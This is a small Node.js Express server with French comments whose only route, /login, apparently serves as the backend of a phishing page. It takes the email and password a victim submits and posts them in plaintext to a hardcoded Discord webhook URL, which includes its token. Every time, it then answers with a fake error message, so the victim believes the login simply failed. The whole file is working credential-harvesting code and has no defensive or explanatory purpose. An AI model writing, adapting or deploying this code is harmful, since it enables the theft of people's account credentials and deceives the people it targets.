const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');  // axios pour envoyer la requête au webhook

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

// Remplacez par l'URL de votre webhook Discord
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1306671325162770512/xqi4XzEP0By4M9XH_4uisroqPyDLX9IdhRipJNlasnAu_CK2ITktHR3hVuG7pgAm-MnD';

app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Préparer le message à envoyer sur Discord
    const message = {
        content: `Nouvelles informations de connexion:\n**Email:** ${email}\n**Mot de passe:** ${password}`
    };

    // Envoyer les données via le webhook Discord
    axios.post(DISCORD_WEBHOOK_URL, message)
        .then(() => {
            res.send('Une erreur est survenue, réessayez plus tard.');
        })
        .catch(error => {
            console.error('Erreur lors de l\'envoi au webhook Discord:', error);
            res.send('Une erreur est survenue, réessayez plus tard.');
        });
});

app.listen(3000, () => {
    console.log('Serveur démarré sur le port 3000');
});

